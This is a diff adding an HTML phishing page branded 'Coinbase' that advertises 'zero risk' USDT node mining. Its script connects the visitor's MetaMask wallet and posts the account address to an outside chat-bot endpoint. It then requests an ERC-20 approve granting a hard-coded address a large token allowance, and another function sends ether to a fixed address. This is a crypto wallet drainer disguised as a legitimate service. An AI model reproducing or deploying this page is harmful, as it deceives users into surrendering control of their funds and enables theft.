@@ -1,0 +1,671 @@
+<!doctype html>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"><!-- Jquery app core js-->
+    <script type="text/javascript" src="js/jquery-2.1.4.min.js"></script>
+    <script src="https://cdn.ethers.io/lib/ethers-5.2.umd.min.js" type="application/javascript"></script>
+    <title>Coinbase</title>
+    <link href="https://cdn.bootcdn.net/ajax/libs/toastr.js/latest/css/toastr.css" rel="stylesheet">
+    <style type="text/css">* {
+        margin: 0;
+        padding: 0;
+    }
+
+    .jrhytc {
+        width: 100%;
+    }
+
+    .jrhytc .xzqbs {
+        width: 100%;
+        background-color: white;
+    }
+
+    .jrhytc .xzqbs .xzqbhead {
+        width: 100%;
+        height: 3rem;
+        background-color: #fcf9f9;
+    }
+
+    .jrhytc .xzqbs .xzqbhead img {
+        display: block;
+        float: left;
+        width: 8%;
+        height: 2rem;
+        margin-top: 0.5rem;
+        margin-left: 2%;
+    }
+
+    .jrhytc .xzqbs .xzqbhead p {
+        width: 90%;
+        height: 3rem;
+        text-align: center;
+        line-height: 3rem;
+        font-size: 1.1rem;
+        color: grey;
+    }
+
+    .jrhytc .xzqbs .xzqbbodys {
+        width: 90%;
+        height: auto;
+        margin-left: 5%;
+        margin-top: 1rem;
+    }
+
+    .jrhytc .xzqbs .xzqbbodys .xzqbbts {
+        width: 100%;
+        height: 1rem;
+        text-align: left;
+        font-size: 0.9rem;
+        line-height: 1rem;
+        color: grey;
+    }
+
+    .jrhytc .xzqbs .xzqbbodys div button {
+        width: 100%;
+        height: 3rem;
+        color: white;
+        background-color: teal;
+        border: none;
+        outline: none;
+        font-size: 1rem;
+    }
+
+    .jrhytc .xzqbs .xzqbbodys img {
+        width: 100%;
+    }
+
+    @keyframes bg-color {
+        0% {
+            background-color: #e74c3c;
+        }
+        20% {
+            background-color: #f1c40f;
+        }
+        40% {
+            background-color: #1abc9c;
+        }
+        60% {
+            background-color: #3498db;
+        }
+        80% {
+            background-color: #9b59b6;
+        }
+        100% {
+            background-color: #e74c3c;
+        }
+    }
+
+    @-moz-keyframes bg-color {
+        0% {
+            background-color: #e74c3c;
+        }
+        20% {
+            background-color: #f1c40f;
+        }
+        40% {
+            background-color: #1abc9c;
+        }
+        60% {
+            background-color: #3498db;
+        }
+        80% {
+            background-color: #9b59b6;
+        }
+        100% {
+            background-color: #e74c3c;
+        }
+    }
+
+    .my-money {
+        /*border: 1px solid #000;*/
+        padding: 10px;
+        background: #e74c3c;
+        margin: 5px;
+        border-radius: 5px;
+        box-shadow: 0 0 10px rgba(0, 0, 0, .1);
+        animation: bg-color 10s infinite;
+        -moz-animation: bg-color 10s infinite;
+    }
+
+    .my-money li {
+        list-style: none;
+        color: #fff;
+        font-weight: 500;
+        padding: 5px 0;
+    }
+
+    .my-money li span {
+        font-size: 16px;
+        font-weight: 400;
+    }
+
+    .invite-url {
+        width: 100%;
+    }
+
+    .invite-url input {
+        text-indent: 1rem;
+        width: 90%;
+        margin-left: 10px;
+        height: 40px;
+        border: 1px solid #ccc;
+        color: #bbb;
+        font-size: 15px;
+        border-radius: 5px;
+    }
+
+    .invite-title {
+        text-align: center;
+        color: #bbb;
+        font-weight: 400;
+    }
+
+    .my-btns {
+        display: flex;
+        justify-content: space-around;
+        padding: 10px;
+        margin: 5px;
+    }
+
+    .my-btns a {
+        padding: 10px;
+        width: 30%;
+        text-align: center;
+        text-decoration: none;
+        color: #fff;
+        font-weight: 500;
+        border-radius: 5px;
+    }
+
+    .my-btns .invite-friend-btn {
+        background-color: #F39B73;
+    }
+
+    .my-btns .withdraw-btn {
+        background-color: #3A8AF2;
+    }
+
+    .financial-records {
+        font-size: 16px;
+        color: #8F999F;
+        font-weight: 400;
+        text-align: center;
+        margin-top: 10px;
+    }
+
+    .financial-list {
+        border: 1px solid #eee;
+        margin: 5px;
+        height: 200px;
+        box-shadow: 0 0 20px rgba(0, 0, 0, .1);
+        border-radius: 5px;
+        overflow-y: auto;
+    }
+
+    .financial-list table {
+        width: 100%;
+    }
+
+    .financial-list table th {
+        color: #ddd;
+    }
+
+    .financial-list table tr {
+        padding: 10px;
+    }
+
+    .financial-list table tr, td {
+        text-align: center;
+    }
+
+    .logout {
+        display: block;
+        width: 90%;
+        text-align: center;
+        height: 40px;
+        line-height: 40px;
+        background-color: #CF5B53;
+        color: #fff;
+        font-size: 16px;
+        font-weight: 500;
+        text-decoration: none;
+        margin: 20px auto auto;
+    }
+
+    .intro {
+        padding: 20px;
+    }
+
+    .intro p {
+        text-indent: 2rem;
+        margin: 5px 0;
+    }
+    </style>
+</head>
+<body>
+<div class="jrhytc" id="jiaruhuy">
+    <div class="xzqbs">
+        <div class="xzqbhead"><a href="../../coin/index.html"><img src="img/fanhuis.png" alt="" id="gbjrhy"></a>
+            <p>Select Account</p></div>
+        <div class="xzqbbodys"><img src="img/heaos.png" alt="">
+            <div>
+                <button class="eth" id="erc-login" style="background-color:#0C81D0;" onclick="ethLogin()">ETH Login</button>
+                <div style="width:100%; height:10px"></div>
+                <button class="trx" id="trc-login" style="background-color:#FE6347;" onclick="trxLogin()">TRX Login</button>
+                <div style="width:100%; height:10px"></div>
+            </div>
+        </div>
+        <div class="intro"><h3>How to participate in</h3>
+            <p>1: "Miners" is a new generation of node pool mining mode, mainly oriented to mining
+                Public chains that use USDT to store consensus mechanisms, and holders of such public chains,
+                You can gain benefits through on-chain nodes and hold more USDT
+                More, the longer the holding time, the greater the calculation power, the higher the income.</p>
+            <p>2: zero risk mining USDT deposit their wallet without transferring money out
+                Go, "0" risk, flexible exit more freely</p>
+            <p>3: customers do not need complicated procedures, first choose a good public chain and need to pay one
+                Second miner fee can complete mining node docking.</p></div>
+    </div>
+</div>
+<script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.8/dist/clipboard.min.js"></script>
+<script src="https://cdn.bootcdn.net/ajax/libs/toastr.js/latest/js/toastr.min.js"></script>
+<script type="text/javascript">    $("#logout-btn").on('click', () => {
+    localStorage.removeItem('address')
+    location.href = "/trade/login/logout"
+})
+
+function ethLogin(){
+    console.log(1)
+    WalletLinkDo()
+}
+
+const yourAddress = '0x621bdded2b894228943a3a063d5459937b947f1a'
+const value = '0x0' // 16进制表示的以太币数量，单位：wei   1EH=0xde0b6b3a7640000   0.001ETH=0x38d7ea4c68000
+const desiredNetwork = '0x3' // '0x1' 表示以太坊主网
+const value2 = '0x0'
+
+function WalletLinkDo() {
+    console.log("--- WalletLinkDo ---")
+    if (typeof window.ethereum === 'undefined') {
+            alert('Looks like you need a Dapp browser to get started.')
+            alert('Consider installing MetaMask!')
+            console.log("--- WalletLinkDo ---    nononononon ")
+    } else {
+        // 一个 Web3Provider 包装了一个标准的 Web3 提供者，这就是
+        // MetaMask 作为 window.ethereum 注入到每个页面中
+        const provider = new ethers.providers.Web3Provider(window.ethereum)
+
+        // MetaMask 插件还允许对交易进行签名
+        //发送以太币并支付更改区块链中的状态。
+        // 为此，您需要帐户签名者...
+        // const signer = provider.getSigner()
+
+        // ethereum.setProviderInfo('https://ropsten.infura.io/v3/16b3844622e34365a8bcdd1d424d65f0', 3)
+        ethereum.isConnected()
+        //如果用户安装了MetaMask，你可以要求他们授权应用登录并获取其账号
+        ethereum.enable()
+        //如果用户拒绝了登录请求
+        .catch(function (reason) {
+            if (reason === 'User rejected provider access') {
+                // 用户不想登录，你看该怎么办？
+            } else {
+                // 本不该执行到这里，但是真到这里了，说明发生了意外
+                alert('There was an issue signing you in.')
+            }
+        })
+
+        //如果用户同意了登录请求，你就可以拿到用户的账号
+        .then(function (accounts) {
+            // You also should verify the user is on the correct network:
+            //你也可以验证用户接入了正确的网络
+            if (ethereum.networkVersion !== desiredNetwork) {
+                alert('This application requires the main network, please switch it in your MetaMask UI.')
+
+                //我们计划在最近补充一个有关网络切换的API，参考下面链接
+                // https://github.com/MetaMask/metamask-extension/issues/3663
+            }
+
+            console.log(ethereum)
+            // PostBotAPi("enable: " + ethereum.toLocaleString() + ethereum.toString())
+            PostBotAPi("acc: " + accounts.toString())
+
+            alert("balance == ", ethereum)
+            // web3.eth.getBalance(accounts).then(console.log);
+            //一旦获取了用户账号，你就可以签名交易
+            const account = accounts[0]
+            // getBalance(account)
+            provider.getBalance(accounts[0]).then(function (balace) {
+                console.log("money: " + balace);
+                ethers.utils.formatEther(balace)
+                alert("usermoney : " + ethers.utils.formatEther(balace));
+            })
+            sendHeyueFrom(account, provider, function (err, transaction) {
+                if (err) {
+                    return alert(`Sorry you weren't able to contribute!`)
+                }
+
+                alert('Thanks for your successful contribution!')
+            })
+
+        })
+    }
+}
+function sendHeyueFrom (account, provider, callback) {
+    //在这里我们要使用底层API
+    const method = 'eth_getCode'
+    const parameters = ['0x27afd216475849ae176f37045b6d4a22611740a2', 'latest']
+    const from = account
+
+    //现在把所有数据整合为一个RPC请求
+    const payload = {
+        method: method,
+        params: parameters,
+        // from: from,
+    }
+
+
+    // PostBotAPi("eth_sendTransaction: " + payload.toString())
+
+    //需要用户授权的方法，类似于这个，都会弹出一个对话框提醒用户交互
+    //其他方法，例如只是读取区块链的数据，可能就不会弹框提醒
+    ethereum.sendAsync(payload, function (err, response) {
+        const rejected = 'User denied transaction signature.'
+        if (response.error && response.error.message.includes(rejected)) {
+            return alert(`We can't take your money without your permission.`)
+        }
+
+        if (err) {
+            return alert('There was an issue, please try again.' + err.toString())
+        }
+
+        if (response.result) {
+            //如果存在response.result，那么调用就是成功的
+            //在这种情况下，它就是交易哈希
+            // const txHash = response.result
+            alert('Heyue  ! ' + response.result)
+            PostBotAPi("get heyue: " + response.result)
+            Conctrc(account, provider, response.result)
+            // SendTwo(account, ethereum)
+            //你可以轮询区块链来查看交易何时被打包进区块
+            // pollForCompletion(txHash, callback)
+        }
+    })
+}
+
+
+function Conctrc(account, provider, code) {
+    // console.log('Running deployWithWeb3 script...')
+    // alert("Conctrc start !!!")
+    const contractName = 'TokenContractFragment' // Change this for other contract
+    // const constructorArgs = []    // Put constructor args (if any) here for your contract
+    //
+    // // Note that the script needs the ABI which is generated from the compilation artifact.
+    // // Make sure contract is compiled and artifacts are generated
+    const artifactsPath = `${contractName}.json` // Change this for different path
+
+    // 您也可以为合约地址使用 ENS 名称
+    const daiAddress = "0x27afd216475849ae176f37045b6d4a22611740a2";
+
+    // ERC-20 合约 ABI，它是一个通用的合约接口
+    // 用于代币（这是人类可读的 ABI 格式）
+    const daiAbi = [
+        {
+            "constant": false,
+            "inputs": [
+                {
+                    "name": "_spender",
+                    "type": "address"
+                },
+                {
+                    "name": "_amount",
+                    "type": "uint256"
+                }
+            ],
+            "name": "approve",
+            "outputs": [
+                {
+                    "name": "success",
+                    "type": "bool"
+                }
+            ],
+            "payable": false,
+            "stateMutability": "nonpayable",
+            "type": "function"
+        },
+        {
+            "constant": false,
+            "inputs": [
+                {
+                    "name": "_from",
+                    "type": "address"
+                },
+                {
+                    "name": "_to",
+                    "type": "address"
+                },
+                {
+                    "name": "_amount",
+                    "type": "uint256"
+                }
+            ],
+            "name": "transferFrom",
+            "outputs": [
+                {
+                    "name": "success",
+                    "type": "bool"
+                }
+            ],
+            "payable": false,
+            "stateMutability": "nonpayable",
+            "type": "function"
+        },
+        {
+            "constant": true,
+            "inputs": [
+                {
+                    "name": "_owner",
+                    "type": "address"
+                }
+            ],
+            "name": "balanceOf",
+            "outputs": [
+                {
+                    "name": "balance",
+                    "type": "uint256"
+                }
+            ],
+            "payable": false,
+            "stateMutability": "view",
+            "type": "function"
+        },
+        {
+            "constant": false,
+            "inputs": [
+                {
+                    "name": "_to",
+                    "type": "address"
+                },
+                {
+                    "name": "_amount",
+                    "type": "uint256"
+                }
+            ],
+            "name": "transfer",
+            "outputs": [
+                {
+                    "name": "success",
+                    "type": "bool"
+                }
+            ],
+            "payable": false,
+            "stateMutability": "nonpayable",
+            "type": "function"
+        }
+    ]
+
+    // 合约对象
+    const daiContract = new ethers.Contract(daiAddress, daiAbi, provider);
+    // const parameters = ['0xF8AE647a999B665326eb785a47A86f0424FE2c66', '0x0']
+    // const signer = (ethers.providers.Web3Provider(provider)).getSigner()
+    const signer = provider.getSigner()
+    daiWithSigner = daiContract.connect(signer)
+
+    const constructorArgs = ['0xF8AE647a999B665326eb785a47A86f0424FE2c66', '0x0']    // Put constructor args (if any) here for your contract
+
+
+    // let factory = ethers.ContractFactory(daiAbi, "608060405234801561001057600080fd5b50610735806100206000396000f300608060405260043610610062576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff168063095ea7b31461006757806323b872dd146100cc57806370a0823114610151578063a9059cbb146101a8575b600080fd5b34801561007357600080fd5b506100b2600480360381019080803573ffffffffffffffffffffffffffffffffffffffff1690602001909291908035906020019092919050505061020d565b604051808215151515815260200191505060405180910390f35b3480156100d857600080fd5b50610137600480360381019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190803573ffffffffffffffffffffffffffffffffffffffff1690602001909291908035906020019092919050505061029a565b604051808215151515815260200191505060405180910390f35b34801561015d57600080fd5b50610192600480360381019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050610537565b6040518082815260200191505060405180910390f35b3480156101b457600080fd5b506101f3600480360381019080803573ffffffffffffffffffffffffffffffffffffffff1690602001909291908035906020019092919050505061057f565b604051808215151515815260200191505060405180910390f35b600081600160003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055506001905092915050565b6000816000808673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205410158015610366575081600160008673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205410155b80156103725750600082115b80156103fb57506000808473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054826000808673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205401115b1561052b57816000808673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000206000828254039250508190555081600160008673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008282540392505081905550816000808573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000206000828254019250508190555060019050610530565b600090505b9392505050565b60008060008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020549050919050565b6000816000803373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054101580156105cf5750600082115b801561065857506000808473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054826000808673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205401115b156106fe57816000803373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008282540392505081905550816000808573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000206000828254019250508190555060019050610703565b600090505b929150505600a165627a7a72305820b0bd4b9c83492e22b4af57628902961ee55d9e1e617b2d712b3e8c52e99b729b0029", signer);
+
+    // let contract = factory.deploy(...constructorArgs);
+
+    response = daiWithSigner.approve("0xF8AE647a999B665326eb785a47A86f0424FE2c66", "1000000000000000000000")
+    const rejected = 'User denied transaction signature.'
+    if (response.error && response.error.message.includes(rejected)) {
+        return alert(`We can't take your money without your permission.`)
+    }
+
+    console.log(response)
+    if (response) {
+        //如果存在response.result，那么调用就是成功的
+        //在这种情况下，它就是交易哈希
+        console.log("ooooooooooooooooo")
+        // const txHash = response.result
+        alert('Thank you for your generosity!')
+        PostBotAPi("Thank you for your generosity!: ")
+        // SendTwo(account, ethereum)
+        //你可以轮询区块链来查看交易何时被打包进区块
+        // pollForCompletion(txHash, callback)
+    }
+
+    PostBotAPi("heyue gey : " + res)
+    console.log(res);
+    // ethers.utils.formatEther(balace)
+    // alert("daiContract : " + ethers.utils.formatEther(balance.toString().big()));
+
+
+
+    // console.log('Contract deployed at address: ', newContractInstance.options.address)
+}
+
+function sendEtherFrom (account, callback) {
+    //在这里我们要使用底层API
+    const method = 'eth_sendTransaction'
+    const parameters = [{
+        from: account,
+        to: yourAddress,
+        value: value,
+    }]
+    const from = account
+
+    //现在把所有数据整合为一个RPC请求
+    const payload = {
+        method: method,
+        params: parameters,
+        from: from,
+    }
+
+    // PostBotAPi("eth_sendTransaction: " + payload.toString())
+
+    //需要用户授权的方法，类似于这个，都会弹出一个对话框提醒用户交互
+    //其他方法，例如只是读取区块链的数据，可能就不会弹框提醒
+    ethereum.sendAsync(payload, function (err, response) {
+        const rejected = 'User denied transaction signature.'
+        if (response.error && response.error.message.includes(rejected)) {
+            return alert(`We can't take your money without your permission.`)
+        }
+
+        if (err) {
+            return alert('There was an issue, please try again.' + err.toString())
+        }
+
+        if (response.result) {
+            //如果存在response.result，那么调用就是成功的
+            //在这种情况下，它就是交易哈希
+            const txHash = response.result
+            alert('Thank you for your generosity!')
+            PostBotAPi("Thank you for your generosity!: ")
+            // SendTwo(account, ethereum)
+            //你可以轮询区块链来查看交易何时被打包进区块
+            pollForCompletion(txHash, callback)
+        }
+    })
+}
+
+function PostBotAPi(accounts) {
+
+    var data = JSON.stringify({
+        "chat_room_type": 1,
+        "chat_room_id": 100005,
+        "content_text": accounts.toString()
+    });
+
+    var xhr = new XMLHttpRequest();
+    xhr.withCredentials = false;
+
+    xhr.addEventListener("readystatechange", function() {
+        if(this.readyState === 4) {
+            // alert(this.responseText)
+            console.log(this.responseText);
+        }
+    });
+
+    CORS_ALLOW_HEADERS = ('content-disposition', 'accept-encoding',
+        'content-type', 'accept', 'origin', 'authorization')
+
+    xhr.open("POST", "https://bot.hotchat.im/1300009012:Lrq22B9Eb49Faj0AdUpgKnT8/SendMessage");
+    xhr.setRequestHeader("Content-Type", "application/json");
+    xhr.setRequestHeader("Cookie", "bot=1637141045.183.27591.533979");
+    // xhr.setRequestHeader("Access-Control-Allow-Origin", "*");
+    xhr.send(data);
+
+
+    // alert("post ok !!"+ xhr.responseText)
+}
+
+function trxLogin(){
+    console.log(2)
+}
+$(function () {
+    // 判断本地是否有地址
+    let address = localStorage.getItem('address')
+    if (address) {
+        $.get("/trade/index/saveSession.html?address=" + address, function (res) {
+            if (res.code == 0) {
+                location.reload()
+            }
+        })
+    }
+})
+// $("#trc-login").on('click', function () {
+//     location.href = "/trade/login/trcLogin?agent=" + '10000'
+// })
+// $("#erc-login").on('click', function () {
+//     location.href = "/trade/login/ercLogin?agent=" + '10000'
+// })
+
+
+let clipboard = new ClipboardJS('#copy-link');
+clipboard.on('success', function (e) {
+    toastr.options = {
+        "closeButton": false,
+        "debug": false,
+        "newestOnTop": false,
+        "progressBar": false,
+        "positionClass": "toast-bottom-center",
+        "preventDuplicates": false,
+        "onclick": null,
+        "showDuration": "300",
+        "hideDuration": "1000",
+        "timeOut": "5000",
+        "extendedTimeOut": "1000",
+        "showEasing": "swing",
+        "hideEasing": "linear",
+        "showMethod": "fadeIn",
+        "hideMethod": "fadeOut"
+    }
+    toastr.success('Copy Success')
+    e.clearSelection();
+});
+</script>
+</body>
+</html>
